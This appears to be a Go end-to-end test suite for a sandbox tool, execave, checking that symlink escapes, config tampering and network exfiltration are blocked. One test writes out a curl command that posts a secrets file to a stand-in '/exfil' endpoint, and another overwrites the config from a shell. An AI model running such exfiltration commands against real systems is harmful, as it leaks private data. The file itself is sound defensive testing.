package e2e_test

import (
	"fmt"
	"net"
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestE2E_PreventingSandboxEscape_SymlinkEscapeLinkInsideMountPointsOutsideRules tests that
// a symlink inside an accessible directory pointing outside the allowed rules is denied.
func TestE2E_PreventingSandboxEscape_SymlinkEscapeLinkInsideMountPointsOutsideRules(t *testing.T) {
	failIfNoBwrap(t)

	tmpDir := testTempDir(t)
	publicDir := filepath.Join(tmpDir, "public")
	secretFile := filepath.Join(tmpDir, "secret", "shadow.txt")
	escapeLink := filepath.Join(publicDir, "escape-link")

	createFile(t, secretFile, "secret data")
	createSymlink(t, secretFile, escapeLink)

	// Only allow access to publicDir, not secretDir
	rules := append(systemPaths(), "fs:rw:"+publicDir)
	configPath := writeConfig(t, rules)

	// Symlink target not mounted → access denied
	result := runExecave(t, "", "--config", configPath, "--", "cat", escapeLink)

	assert.NotEqual(t, 0, result.ExitCode)
	assert.Contains(t, result.Stderr, "escape-link: No such file or directory")
}

// TestE2E_PreventingSandboxEscape_SymlinkChainBrokenAtDeniedIntermediateHop tests that a
// symlink chain stops at a denied intermediate hop and never reaches the final target.
func TestE2E_PreventingSandboxEscape_SymlinkChainBrokenAtDeniedIntermediateHop(t *testing.T) {
	env := newMonitorTest(t)

	mountDir := filepath.Join(env.TmpDir, "mount")
	nomatchDir := filepath.Join(env.TmpDir, "nomatch")
	hop1 := filepath.Join(mountDir, "hop1")
	hop2 := filepath.Join(nomatchDir, "hop2")
	secretFile := filepath.Join(mountDir, "secret.txt")

	createFile(t, secretFile, "secret")
	// hop2 → secret.txt (in allowed dir, but unreachable)
	createSymlink(t, secretFile, hop2)
	// hop1 → hop2 (through denied dir)
	createSymlink(t, hop2, hop1)

	rules := append(systemPaths(), "fs:ro:"+mountDir)

	result := env.runMonitored(t, rules, "cat", hop1)
	assert.NotEqual(t, 0, result.ExitCode)

	homeDir, err := os.UserHomeDir()
	require.NoError(t, err)
	hop1Rel, err := filepath.Rel(homeDir, hop1)
	require.NoError(t, err)
	hop2Rel, err := filepath.Rel(homeDir, hop2)
	require.NoError(t, err)

	// First hop OK, intermediate hop denied
	assertWebUIHasEntry(t, result.WebUI, "READ", "~/"+hop1Rel, "OK", "fs:ro:"+mountDir)
	assertWebUIHasEntry(t, result.WebUI, "READ", "~/"+hop2Rel, "DENY", "no-matching-rule")

	// Secret file never reached
	assert.NotContains(t, result.WebUI, secretFile)
}

// TestE2E_PreventingSandboxEscape_ConfigFileModificationPrevented tests that the config file
// is forced read-only inside the sandbox even when the parent directory is rw, preventing
// privilege escalation by modifying the config.
func TestE2E_PreventingSandboxEscape_ConfigFileModificationPrevented(t *testing.T) {
	failIfNoBwrap(t)

	tmpDir := testTempDir(t)
	configPath := filepath.Join(tmpDir, "execave.toml")
	otherFile := filepath.Join(tmpDir, "other.txt")
	createFile(t, otherFile, "other data")

	rules := append(systemPaths(), "fs:rw:"+tmpDir)
	writeConfigInDir(t, tmpDir, rules)

	// Config file forced read-only even though parent is rw
	result := runExecave(t, "", "--config", configPath, "--",
		"sh", "-c", "echo '{}' > "+configPath)

	assert.NotEqual(t, 0, result.ExitCode)
	assert.Contains(t, result.Stderr, "execave: config file forced read-only")
	assert.Contains(t, result.Stderr, "execave.toml: Read-only file system")

	// Other files in the same directory remain writable
	result = runExecave(t, "", "--config", configPath, "--",
		"sh", "-c", "echo modified >> "+otherFile)
	assertExitCode(t, result, 0)
}

// TestE2E_PreventingSandboxEscape_DataExfiltrationViaNetworkDenied tests that a sandboxed
// command with access to sensitive files cannot send data to unauthorized network endpoints.
func TestE2E_PreventingSandboxEscape_DataExfiltrationViaNetworkDenied(t *testing.T) {
	failIfNoBwrap(t)
	failIfNoCurl(t)

	tmpDir := testTempDir(t)
	secretFile := filepath.Join(tmpDir, "secrets.txt")
	createFile(t, secretFile, "sensitive data")

	host, port := testHTTPSServer(t, "TRUSTED_API")

	rules := append(systemPaths(),
		"fs:ro:"+tmpDir,
		fmt.Sprintf("net:http:%s:%s", host, port),
	)
	configPath := writeConfig(t, rules)

	// Trusted endpoint works
	result := runExecave(t, "", "--config", configPath, "--",
		"curl", "-sk", fmt.Sprintf("https://%s/", net.JoinHostPort(host, port)))
	assertExitCode(t, result, 0)
	assert.Contains(t, result.Stdout, "TRUSTED_API")

	// Exfiltration to untrusted endpoint denied
	result = runExecave(t, "", "--config", configPath, "--",
		"curl", "-sk", "--max-time", "5",
		"-d", "@"+secretFile,
		"https://192.0.2.1:443/exfil")

	assert.NotEqual(t, 0, result.ExitCode)
}

// TestE2E_PreventingSandboxEscape_SymlinkLoopHitsDepthLimit tests that a symlink loop
// is detected and access is denied after exceeding the 40-link depth limit.
func TestE2E_PreventingSandboxEscape_SymlinkLoopHitsDepthLimit(t *testing.T) {
	env := newMonitorTest(t)

	mountDir := filepath.Join(env.TmpDir, "mount")
	loopA := filepath.Join(mountDir, "loop-a")
	loopB := filepath.Join(mountDir, "loop-b")

	createSymlink(t, loopB, loopA)
	createSymlink(t, loopA, loopB)

	rules := append(systemPaths(), "fs:ro:"+mountDir)

	result := env.runMonitored(t, rules, "cat", loopA)
	assert.NotEqual(t, 0, result.ExitCode)
	assert.Contains(t, result.Stderr, "loop-a: Too many levels of symbolic links")

	assertWebUIHasEntry(t, result.WebUI, "DENY", "symlink-depth-limit-exceeded")
}
